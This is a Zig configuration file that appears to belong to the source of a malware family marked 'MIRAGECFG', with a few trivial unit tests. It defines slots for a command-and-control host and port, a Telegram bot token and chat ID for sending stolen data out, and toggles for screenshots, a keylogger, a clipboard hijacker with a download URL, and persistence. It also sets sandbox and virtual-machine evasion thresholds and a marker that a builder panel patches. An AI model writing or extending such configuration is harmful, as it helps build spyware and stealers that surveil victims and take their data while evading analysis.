const std = @import("std");

// ── Crypto parameters (not secrets — required for hash functions) ──
pub const SEED: u32 = 0x61472f96;
pub const STRING_KEY_ENC: [16]u8 = .{ 0xbf, 0xcd, 0x2f, 0x77, 0xdf, 0xd9, 0xb9, 0xf9, 0x58, 0xf7, 0x0b, 0xa4, 0x49, 0xab, 0xad, 0x3b };
pub const SSN_XOR_KEY: u32 = 0xA3B5C7D9;

// ── Runtime flags ──
pub const ENABLE_PERSISTENCE: bool = false;
pub const PERSIST_METHOD: []const u8 = &.{};
pub const ENABLE_SCREENSHOT: bool = true;
pub const ENABLE_TELEGRAM_BACKUP: bool = true;
pub const TELEGRAM_BOT_TOKEN: [46]u8 = .{0} ** 46;
pub const TELEGRAM_CHAT_ID: [18]u8 = .{0} ** 18;
pub const C2_HOST: [16]u8 = .{0} ** 16;
pub const C2_PORT: u16 = 8443;
pub const SLEEP_MIN_MS: u64 = 5000;
pub const SLEEP_JITTER_MS: u64 = 3000;

pub const EVASION_SCORE_THRESHOLD: u32 = 60;
pub const VM_MIN_RAM: u64 = 2 * 1024 * 1024 * 1024;
pub const VM_MIN_CPU_CORES: u8 = 2;
pub const VM_MIN_SCREEN_WIDTH: u32 = 1280;
pub const VM_MIN_SCREEN_HEIGHT: u32 = 720;
pub const VM_TIMING_ANOMALY_TSC: u64 = 10_000_000;

pub const ENABLE_KEYLOGGER: bool = false;
pub const ENABLE_SSP: bool = false;
pub const ENABLE_CLIPPER: bool = false;
pub const CLIPPER_DOWNLOAD_URL: [128]u8 = .{0} ** 128;

pub const HWID_BAN_LIST: []const []const u8 = &.{};

// Builder config marker — exported so linker keeps it in .rdata
// Panel builder scans for this signature to locate config data
pub export var MIRAGECFG_MARKER: [17]u8 = .{ 'M', 'I', 'R', 'A', 'G', 'E', 'C', 'F', 'G', ':', 'P', 'A', 'T', 'C', 'H', ':', ' ' };

test "MIRAGECFG marker present" {
    try std.testing.expect(MIRAGECFG_MARKER[0] == 'M');
    try std.testing.expect(MIRAGECFG_MARKER[8] == 'G');
}

test "SEED non-zero" {
    try std.testing.expect(SEED != 0);
}

test "STRING_KEY_ENC non-zero" {
    for (STRING_KEY_ENC) |b| {
        try std.testing.expect(b != 0);
    }
}
